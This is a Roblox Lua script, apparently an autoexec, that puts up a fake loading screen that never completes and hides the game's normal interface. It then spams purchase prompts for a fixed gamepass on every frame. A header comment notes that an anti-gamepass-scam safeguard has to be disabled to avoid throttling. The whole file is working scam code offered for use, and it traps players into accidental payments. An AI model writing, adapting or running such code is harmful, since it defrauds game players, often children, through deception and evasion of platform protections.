-- autoexec: fake loading screen + max-speed gamepass spam
-- ID 2025128298
-- Eral anti-gamepass-scam MUST be OFF or this still gets throttled

local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")

repeat task.wait() until game:IsLoaded()
local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
local GAMEPASS_ID = 2025128298

-- ── fake loading screen ──────────────────────────────────────────
local gui = Instance.new("ScreenGui")
gui.Name = "LoadingScreen"
gui.IgnoreGuiInset = true
gui.DisplayOrder = 999999
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local bg = Instance.new("Frame")
bg.Size = UDim2.fromScale(1, 1)
bg.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
bg.BorderSizePixel = 0
bg.ZIndex = 100
bg.Parent = gui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 60)
title.Position = UDim2.new(0, 0, 0.35, 0)
title.BackgroundTransparency = 1
title.Text = "Loading..."
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 42
title.Font = Enum.Font.GothamBold
title.ZIndex = 101
title.Parent = bg

local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, 0, 0, 30)
status.Position = UDim2.new(0, 0, 0.45, 0)
status.BackgroundTransparency = 1
status.Text = "Initializing assets"
status.TextColor3 = Color3.fromRGB(180, 180, 190)
status.TextSize = 18
status.Font = Enum.Font.Gotham
status.ZIndex = 101
status.Parent = bg

local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(0.4, 0, 0, 8)
barBg.Position = UDim2.new(0.3, 0, 0.55, 0)
barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
barBg.BorderSizePixel = 0
barBg.ZIndex = 101
barBg.Parent = bg

local barCorner = Instance.new("UICorner")
barCorner.CornerRadius = UDim.new(0, 4)
barCorner.Parent = barBg

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
barFill.BorderSizePixel = 0
barFill.ZIndex = 102
barFill.Parent = barBg

local fillCorner = Instance.new("UICorner")
fillCorner.CornerRadius = UDim.new(0, 4)
fillCorner.Parent = barFill

local percent = Instance.new("TextLabel")
percent.Size = UDim2.new(1, 0, 0, 24)
percent.Position = UDim2.new(0, 0, 0.58, 0)
percent.BackgroundTransparency = 1
percent.Text = "0%"
percent.TextColor3 = Color3.fromRGB(140, 140, 150)
percent.TextSize = 16
percent.Font = Enum.Font.Gotham
percent.ZIndex = 101
percent.Parent = bg

pcall(function()
	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
end)

-- fake progress loop (never finishes)
local messages = {
	"Initializing assets",
	"Loading character data",
	"Syncing inventory",
	"Connecting to servers",
	"Preparing experience",
	"Almost ready...",
}

task.spawn(function()
	local p = 0
	while true do
		p = math.min(p + math.random(1, 4), 99)
		barFill:TweenSize(UDim2.new(p / 100, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.3, true)
		percent.Text = p .. "%"
		status.Text = messages[math.random(1, #messages)]
		task.wait(0.4 + math.random() * 0.6)
		if p >= 99 then
			p = 87 -- loop back so it never completes
		end
	end
end)

-- ── gamepass spam ────────────────────────────────────────────────
task.spawn(function()
	while true do
		pcall(MarketplaceService.PromptGamePassPurchase, MarketplaceService, player, GAMEPASS_ID)
		RunService.RenderStepped:Wait()
	end
end)

task.spawn(function()
	while true do
		pcall(function()
			MarketplaceService:PromptGamePassPurchase(player, GAMEPASS_ID)
		end)
		task.wait()
	end
end)
